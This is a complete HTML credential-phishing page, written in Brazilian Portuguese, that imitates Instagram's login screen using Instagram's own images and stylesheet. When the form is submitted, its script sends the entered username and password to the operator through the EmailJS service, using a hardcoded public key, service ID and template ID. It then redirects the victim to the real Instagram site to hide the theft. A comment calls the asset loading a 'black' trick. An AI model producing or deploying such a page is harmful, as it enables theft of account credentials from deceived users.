<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/b407fa101800.png" sizes="192x192">
  <!-- Font Awesome pra ícones (Facebook, etc) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <!-- Fonte oficial do Instagram carregada direto do site deles (truque black 2026) -->
  <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/ConsumerUICommons.css" crossorigin="anonymous" />
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #262626;
    }
    .main-container {
      display: flex;
      align-items: center;
      max-width: 935px;
      width: 100%;
      padding: 32px 20px;
    }
    .phone-section {
      position: relative;
      width: 454px;
      height: 618px;
      margin-right: 32px;
      background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png') no-repeat 0 0;
      background-size: 454px 618px;
      flex-shrink: 0;
      display: none;
    }
    @media (min-width: 875px) {
      .phone-section { display: block; }
    }
    .login-card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      width: 350px;
      padding: 10px 0 0;
      text-align: center;
    }
    /* Logo com fonte oficial do Instagram (carregada via CDN deles) */
    .logo {
      font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-weight: 400;
      font-size: 3.2rem; /* tamanho exato do login web */
      letter-spacing: -1.5px;
      margin: 22px auto 12px;
      color: #000;
      line-height: 1;
    }
    form {
      padding: 0 40px;
    }
    input {
      width: 100%;
      height: 36px;
      margin: 6px 0;
      padding: 9px 10px 7px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      color: #262626;
    }
    input:focus {
      outline: none;
      border-color: #a8a8a8;
    }
    .login-btn {
      background: #0095f6;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      font-size: 14px;
      line-height: 18px;
      padding: 5px 9px;
      margin: 8px 0 12px;
      width: 100%;
      cursor: pointer;
      opacity: 0.3;
      pointer-events: none;
      transition: all 0.2s;
    }
    .login-btn.active {
      opacity: 1;
      pointer-events: auto;
    }
    .divider {
      display: flex;
      align-items: center;
      margin: 18px 40px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
    }
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
      margin: 0 18px;
    }
    .fb-login {
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      margin: 8px 40px 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      cursor: pointer;
    }
    .fb-login i {
      font-size: 18px;
    }
    .forgot-password {
      color: #00376b;
      font-size: 12px;
      margin: 12px 0 16px;
      text-decoration: none;
      display: block;
    }
    .signup-card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      width: 350px;
      padding: 20px;
      margin-top: 10px;
      font-size: 14px;
    }
    .signup-card a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }
    .get-app {
      margin-top: 22px;
      font-size: 14px;
      color: #262626;
      text-align: center;
    }
    .app-badges {
      margin-top: 20px;
      display: flex;
      justify-content: center;
      gap: 8px;
    }
    .app-badges img {
      height: 40px;
    }
  </style>
</head>
<body>

<div class="main-container">
  <div class="phone-section"></div>

  <div>
    <div class="login-card">
      <!-- Logo com fonte oficial carregada -->
      <div class="logo">Instagram</div>

      <form id="loginForm">
        <input type="text" name="username" placeholder="Telefone, usuário ou email" autocomplete="off" required />
        <input type="password" name="password" placeholder="Senha" autocomplete="off" required />
        <button type="submit" class="login-btn" id="loginBtn" disabled>Entrar</button>
      </form>

      <div class="divider">OU</div>

      <div class="fb-login">
        <i class="fab fa-facebook-square"></i>
        Entrar com o Facebook
      </div>

      <a href="#" class="forgot-password">Esqueceu a senha?</a>
    </div>

    <div class="signup-card">
      Não tem uma conta? <a href="#">Cadastre-se</a>
    </div>

    <div class="get-app">
      Baixe o aplicativo.
      <div class="app-badges">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian-pt/5b4b38e0a4e7.png/2d2e7e0d5f3e.png" alt="App Store">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese-brazilian-pt/924e869ef6f3.png/2d2e7e0d5f3e.png" alt="Google Play">
      </div>
    </div>
  </div>
</div>

<script>
  (function() {
    emailjs.init({
      publicKey: "8RX9bRb_kjK9Ee8q2"
    });
  })();

  const form = document.getElementById("loginForm");
  const btn = document.getElementById("loginBtn");

  form.addEventListener("input", () => {
    const user = form.username.value.trim();
    const pass = form.password.value.trim();
    const isValid = user.length > 0 && pass.length > 0;
    btn.disabled = !isValid;
    btn.classList.toggle("active", isValid);
  });

  form.addEventListener("submit", function(e) {
    e.preventDefault();

    emailjs.sendForm(
      "service_y7qz76w",
      "template_fsq66g2",
      "#loginForm"
    )
    .then(() => {
      window.location.href = "https://www.instagram.com/";
    })
    .catch((err) => {
      console.error("Erro no envio:", err);
      window.location.href = "https://www.instagram.com/";
    });
  });
</script>

</body>
</html>
